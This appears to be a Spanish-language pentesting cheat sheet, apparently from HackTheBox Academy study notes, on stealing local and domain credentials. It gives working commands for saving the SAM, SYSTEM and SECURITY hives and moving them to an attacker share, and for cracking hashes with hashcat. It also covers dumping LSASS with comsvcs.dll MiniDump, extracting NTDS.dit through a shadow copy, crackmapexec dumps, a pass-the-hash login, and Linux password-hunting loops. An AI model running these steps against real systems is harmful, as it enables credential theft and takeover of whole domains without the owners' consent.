---
title: Local Password Attack
date: 2022-08-12 13:25:30 +/-TTTT
categories: [UTILITIES, Windows, Linux]
tags: [SAM, NTDS, NTLM,]     # TAG names should always be lowercase
---

## PASSWORD ATTACK LOCAL
### SAM ATTACK

|Registro|	Descripción|
|:------------|:----------:|
|hklm\sam|	Contiene los hash asociados con las contraseñas de cuentas locales. Necesitaremos los hashes para poder descifrarlos y obtener las contraseñas de las cuentas de usuario en texto claro.|
|hklm\system|	Contiene la clave de arranque del sistema, que se utiliza para cifrar la base de datos SAM. Necesitaremos la clave de arranque para descifrar la base de datos SAM.|
|hklm\security|	Contiene credenciales almacenadas en caché para cuentas de dominio. Podemos beneficiarnos de tener esto en un objetivo de Windows unido a un dominio.|

Podemos usar reg.exe para guardar estos registros

```powershell
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save

The operation completed successfully.
```

Técnicamente, solo necesitaremos hklm\sam& hklm\system, pero hklm\securitytambién puede ser útil para guardar, ya que puede contener hashes asociados con las credenciales de la cuenta 
de usuario del dominio en caché presentes en los hosts unidos al dominio. Una vez que los registros se guardan sin conexión, podemos usar varios métodos para transferirlas a nuestro host de ataque.

Con smbserver.py podemos pasarnos los archivos que obtuvimos.

```powershell
C:\> move sam.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move security.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move system.save \\10.10.15.16\CompData
        1 file(s) moved.

```
Con ayuda de secretsdump.py podemos obtener los hashes `NT` y `LM`

```shell
secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```
Y con ayuda de `hashcat` podemos intentar crackear los hashes obtenidos.

```shell
sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```
Igualmente podemos dumplear los `LSA` mediante crackmapexec 

```shell
gu3ro@htb[/htb]$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```

### LSASS ATTACK

Dentro de la máquina víctima podemos irnos al explorador de tarea y hacer click derecho en la tarea de `Local Security Authority Process` y click en `Select Create dump file` esto creará un archivo
`lsass.DMP` en la carpeta temp del local.

Con eso nos pasamos el archivo a nuestra máquina local e intentamos obtener las contraseñas con `pypykatz`

Otra opción de obtener el `lsass.DMP` es mediante `rundll32.exe` y `comsvcs.dll` directamente desde la terminal. Primero buscamos el PID del proceso lsass que se está ejecutando.

```powershell
PS C:\Windows\system32> Get-Process lsass

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
   1260      21     4948      15396       2.56    672   0 lsass
```

Creamos un dumpeo mediante rundll32.exe y comsvcs.dll

```powershell
PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```

Finalmente mediante pypykatz intentamos obtener las contraseñas

```shell
pypykatz lsa minidump /home/peter/Documents/lsass.dmp
```

### Active Directory

NT Directory Services( NTDS) es el servicio de directorio utilizado con AD para buscar y organizar recursos de red. Recuerde que NTDS.ditel 
archivo se almacena en %systemroot$/ntdslos controladores de dominio de un bosque . Los .ditsoportes para el árbol de información del directorio. 
Este es el archivo de base de datos principal asociado con AD y almacena todos los nombres de usuario de dominio, hash de contraseña y otra información 
de esquema crítica. Si se puede capturar este archivo, podríamos potencialmente comprometer cada cuenta en el dominio

Creando Shadow Copy de C:
Podemos usar vssadminpara crear una instantánea de volumen ( VSS) de la unidad C: o cualquier volumen que el administrador haya elegido cuando instaló AD inicialmente. 
Es muy probable que NTDS se almacene en C: ya que esa es la ubicación predeterminada seleccionada en la instalación, pero es posible cambiar la ubicación. 
Usamos VSS para esto porque está diseñado para hacer copias de volúmenes que se pueden leer y escribir activamente sin necesidad de desactivar una aplicación o sistema en particular. 
Muchos software diferentes de copia de seguridad y recuperación ante desastres utilizan 
VSS para realizar operaciones.

```powershell
*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:

vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Successfully created shadow copy for 'C:\'
    Shadow Copy ID: {186d5979-2f2b-4afe-8101-9f1111e4cb1a}
    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
```
Copiando NTDS.dit desde el VSS
Luego podemos copiar el archivo NTDS.dit de la instantánea de volumen de C: en otra ubicación en el disco para prepararnos para mover NTDS.dit a nuestro host de ataque.

```powershell
*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit

        1 file(s) copied.
```

Podemos usar igualmente `crackmapexec` para volcar el ntds

```shell
crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
```
Consideraciones de pasar el hash
Todavía podemos usar hashes para intentar autenticarnos con un sistema usando un tipo de ataque llamado Pass-the-Hash( PtH). Un ataque PtH aprovecha el protocolo de autenticación NTLM 
para autenticar a un usuario mediante un hash de contraseña. En lugar de username: clear-text passwordcomo formato de inicio de sesión, podemos usar username: password hash.

```shell
evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"
```
Podemos hacer uso de `lazagne` para buscar contraseñas en el sistema.

## Linux

Podemos hacer uso de la herramienta `lazagne`, `firefox_decrypt.py` o `mimipenguin` pero este último necesita permisos de administrador.

También podemos hacer uso de scripts que nos busquen archivos importantes.

```shell
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done

File extension:  .conf
/run/tmpfiles.d/static-nodes.conf
/run/NetworkManager/resolv.conf
/run/NetworkManager/no-stub-resolv.conf
/run/NetworkManager/conf.d/10-globally-managed-devices.conf
...SNIP...

for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
```

```shell
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```
Para poder usar `firepwd` necesitamos los archivos `login.json` y `key4.db`


